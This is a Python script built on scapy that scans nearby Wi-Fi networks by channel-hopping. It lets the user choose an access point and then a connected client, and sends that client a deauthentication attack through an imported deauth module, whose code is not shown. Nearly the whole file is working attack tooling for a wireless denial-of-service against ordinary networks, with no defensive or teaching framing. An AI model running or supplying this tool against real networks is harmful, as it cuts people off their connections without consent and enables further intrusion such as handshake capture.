from scapy.all import *
from threading import Thread
import time
import os
import inquirer
from find_ap_clients import find_ap_clients
import deauth_client


networks = {}  # note the double round-brackets
spacing = "{:<20} {:<40} {:<10} {:<10} {:<10}"


def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2.upper()
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        if bssid not in networks:
            networks[bssid] = [ssid, dbm_signal, channel, crypto]
            print(spacing.format(bssid, ssid,
                  dbm_signal, channel, list(crypto)[0]))


def change_channel(total_time, interval):
    ch = 1
    for i in range(1, int(total_time/interval)):
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each time defined in interval
        ch = ch % 14 + 1
        time.sleep(interval)


def selectbssid():
    questions = [
        inquirer.List('app_bssid',
                      message="Select BSSID oof the access point",
                      choices=networks
                      ),
    ]

    return inquirer.prompt(questions)["app_bssid"]


def selectbssiddual(values):
    questions = [
        inquirer.List('both_bssid',
                      message="Select target station to deauth",
                      choices=values
                      ),
    ]

    target_bssid = inquirer.prompt(questions)["both_bssid"]

    return dict(target_bssid=target_bssid, ap_bssid=values[target_bssid])


if __name__ == "__main__":

    # TODO: Activate monitoring from code by getting arguments
    # interface name, check using iwconfig
    interface = "wlan0mon"
    total_time = 60

    channel_changer = Thread(target=change_channel, args=(total_time, 0.5))
    channel_changer.daemon = True
    channel_changer.start()

    print(spacing.format("BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"))
    sniffer_thread = AsyncSniffer(prn=callback, iface=interface)
    sniffer_thread.start()
    time.sleep(10)
    sniffer_thread.stop()

    ap_bssid = selectbssid()
    find_ap_task = find_ap_clients()
    find_ap_task.sniffAction(ap_bssid, 10)

    time.sleep(10)
    # TODO: create reusable select
    # TODO: get two values from select
    response = selectbssiddual(find_ap_task.stations)
    print(response)
    deauth_client.deauth(response["target_bssid"], response["ap_bssid"])
